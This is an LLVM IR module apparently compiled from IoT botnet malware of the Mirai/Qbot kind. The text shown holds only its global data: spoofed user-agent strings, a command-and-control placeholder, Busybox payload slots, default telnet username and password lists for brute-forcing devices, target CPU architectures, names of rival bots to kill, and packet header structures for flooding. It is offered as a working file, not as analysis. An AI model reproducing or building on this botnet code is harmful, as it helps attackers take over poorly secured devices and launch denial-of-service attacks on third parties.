; ModuleID = 'llvm-link'
source_filename = "llvm-link"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.1 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.2 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.3 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.6 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.7 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.8 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.9 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.10 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.11 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.12 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.13 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.14 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.15 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.16 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.17 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.18 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.19 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.20 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.21 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.22 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.23 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.24 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.25 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.26 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.27 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.28 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.30 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.31 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.32 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.33 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.34 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.35 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.36 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.37 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.38 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.39 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.40 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.41 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.42 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.43 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.44 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.45 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.46 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.47 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.48 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.49 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.50 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.51 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.52 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.53 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.54 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.56 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.58 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@useragents = dso_local global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.58, i32 0, i32 0)], align 16
@mainCommSock = dso_local global i32 0, align 4
@currentServer = dso_local global i32 -1, align 4
@numpids = dso_local global i64 0, align 8
@macAddress = dso_local global [6 x i8] zeroinitializer, align 1
@.str.59 = private unnamed_addr constant [11 x i8] c"IP:BOTPORT\00", align 1
@commServer = dso_local global [1 x i8*] [i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.59, i32 0, i32 0)], align 8
@.str.60 = private unnamed_addr constant [11 x i8] c"BB PAYLOAD\00", align 1
@Busybox_Payload = dso_local global i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0), align 8
@.str.61 = private unnamed_addr constant [8 x i8] c"PAYLOAD\00", align 1
@Payload = dso_local global i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.61, i32 0, i32 0), align 8
@.str.62 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.64 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.66 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@Telnet_Usernames = dso_local global [19 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0)], align 16
@.str.68 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.69 = private unnamed_addr constant [10 x i8] c"S2fGqNFs\00\00", align 1
@.str.70 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.71 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.72 = private unnamed_addr constant [10 x i8] c"hunt5759\00\00", align 1
@.str.73 = private unnamed_addr constant [10 x i8] c"OxhlwSG8\00\00", align 1
@.str.74 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.75 = private unnamed_addr constant [14 x i8] c"7ujMko0admin\00\00", align 1
@.str.76 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@Telnet_Passwords = dso_local global [19 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0)], align 16
@Mirai_Usernames = dso_local global [1 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0)], align 8
@Mirai_Passwords = dso_local global [1 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0)], align 8
@.str.77 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"mips64\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"sh2eb\00", align 1
@.str.81 = private unnamed_addr constant [7 x i8] c"sh2elf\00", align 1
@.str.82 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.83 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.85 = private unnamed_addr constant [6 x i8] c"armv5\00", align 1
@.str.86 = private unnamed_addr constant [8 x i8] c"armv4tl\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"armv4\00", align 1
@.str.88 = private unnamed_addr constant [6 x i8] c"armv6\00", align 1
@.str.89 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"powerpc\00", align 1
@.str.91 = private unnamed_addr constant [13 x i8] c"powerpc440fp\00", align 1
@.str.92 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.93 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"sparc\00", align 1
@.str.95 = private unnamed_addr constant [7 x i8] c"earyzq\00", align 1
@.str.96 = private unnamed_addr constant [7 x i8] c"cemtop\00", align 1
@.str.97 = private unnamed_addr constant [7 x i8] c"vtyhat\00", align 1
@.str.98 = private unnamed_addr constant [7 x i8] c"vvglma\00", align 1
@.str.99 = private unnamed_addr constant [7 x i8] c"nvitpj\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"razdzn\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"lnkfmx\00", align 1
@.str.102 = private unnamed_addr constant [7 x i8] c"qvmxvl\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"ajoomk\00", align 1
@.str.104 = private unnamed_addr constant [7 x i8] c"fwdfvf\00", align 1
@.str.105 = private unnamed_addr constant [7 x i8] c"atxhua\00", align 1
@.str.106 = private unnamed_addr constant [7 x i8] c"qtmzbn\00", align 1
@.str.107 = private unnamed_addr constant [7 x i8] c"adcvds\00", align 1
@.str.108 = private unnamed_addr constant [10 x i8] c"amsjkfbns\00", align 1
@.str.109 = private unnamed_addr constant [9 x i8] c"xdf.mips\00", align 1
@.str.110 = private unnamed_addr constant [6 x i8] c"xdf.*\00", align 1
@.str.111 = private unnamed_addr constant [5 x i8] c"xdf*\00", align 1
@.str.112 = private unnamed_addr constant [11 x i8] c"xdf.mipsel\00", align 1
@.str.113 = private unnamed_addr constant [11 x i8] c"xdf.x86_64\00", align 1
@.str.114 = private unnamed_addr constant [9 x i8] c"xdf.arm7\00", align 1
@.str.115 = private unnamed_addr constant [8 x i8] c"xdf.ppc\00", align 1
@.str.116 = private unnamed_addr constant [16 x i8] c"hex**hexxdf.sh4\00", align 1
@.str.117 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.118 = private unnamed_addr constant [6 x i8] c"jack*\00", align 1
@.str.119 = private unnamed_addr constant [6 x i8] c"hack*\00", align 1
@.str.120 = private unnamed_addr constant [11 x i8] c"arm*tel*b1\00", align 1
@.str.121 = private unnamed_addr constant [3 x i8] c"b2\00", align 1
@.str.122 = private unnamed_addr constant [3 x i8] c"b3\00", align 1
@.str.123 = private unnamed_addr constant [3 x i8] c"b4\00", align 1
@.str.124 = private unnamed_addr constant [3 x i8] c"b5\00", align 1
@.str.125 = private unnamed_addr constant [3 x i8] c"b6\00", align 1
@.str.126 = private unnamed_addr constant [3 x i8] c"b7\00", align 1
@.str.127 = private unnamed_addr constant [3 x i8] c"b8\00", align 1
@.str.128 = private unnamed_addr constant [3 x i8] c"b9\00", align 1
@.str.129 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.130 = private unnamed_addr constant [6 x i8] c"orion\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"lol*\00", align 1
@.str.132 = private unnamed_addr constant [9 x i8] c"busybox*\00", align 1
@.str.133 = private unnamed_addr constant [8 x i8] c"badbox*\00", align 1
@.str.134 = private unnamed_addr constant [9 x i8] c"DFhxdhdf\00", align 1
@.str.135 = private unnamed_addr constant [10 x i8] c"dvrHelper\00", align 1
@.str.136 = private unnamed_addr constant [8 x i8] c"FDFDHFC\00", align 1
@.str.137 = private unnamed_addr constant [5 x i8] c"FEUB\00", align 1
@.str.138 = private unnamed_addr constant [9 x i8] c"FTUdftui\00", align 1
@.str.139 = private unnamed_addr constant [9 x i8] c"GHfjfgvj\00", align 1
@.str.140 = private unnamed_addr constant [6 x i8] c"jhUOH\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"JIPJIPJj\00", align 1
@.str.142 = private unnamed_addr constant [10 x i8] c"JIPJuipjh\00", align 1
@.str.143 = private unnamed_addr constant [10 x i8] c"kmyx86_64\00", align 1
@.str.144 = private unnamed_addr constant [10 x i8] c"lolmipsel\00", align 1
@.str.145 = private unnamed_addr constant [8 x i8] c"RYrydry\00", align 1
@.str.146 = private unnamed_addr constant [9 x i8] c"TwoFace*\00", align 1
@.str.147 = private unnamed_addr constant [9 x i8] c"UYyuyioy\00", align 1
@.str.148 = private unnamed_addr constant [9 x i8] c"XDzdfxzf\00", align 1
@.str.149 = private unnamed_addr constant [4 x i8] c"xx*\00", align 1
@.str.150 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.151 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.152 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.153 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.154 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.155 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.156 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.157 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.158 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.159 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.160 = private unnamed_addr constant [3 x i8] c"10\00", align 1
@.str.161 = private unnamed_addr constant [3 x i8] c"11\00", align 1
@.str.162 = private unnamed_addr constant [3 x i8] c"12\00", align 1
@.str.163 = private unnamed_addr constant [3 x i8] c"13\00", align 1
@.str.164 = private unnamed_addr constant [7 x i8] c"owari*\00", align 1
@.str.165 = private unnamed_addr constant [3 x i8] c"14\00", align 1
@.str.166 = private unnamed_addr constant [3 x i8] c"15\00", align 1
@.str.167 = private unnamed_addr constant [3 x i8] c"16\00", align 1
@.str.168 = private unnamed_addr constant [3 x i8] c"17\00", align 1
@.str.169 = private unnamed_addr constant [3 x i8] c"18\00", align 1
@.str.170 = private unnamed_addr constant [3 x i8] c"19\00", align 1
@.str.171 = private unnamed_addr constant [3 x i8] c"20\00", align 1
@.str.172 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.173 = private unnamed_addr constant [7 x i8] c"badbox\00", align 1
@.str.174 = private unnamed_addr constant [7 x i8] c"Mirai*\00", align 1
@.str.175 = private unnamed_addr constant [11 x i8] c"cunty*IoT*\00", align 1
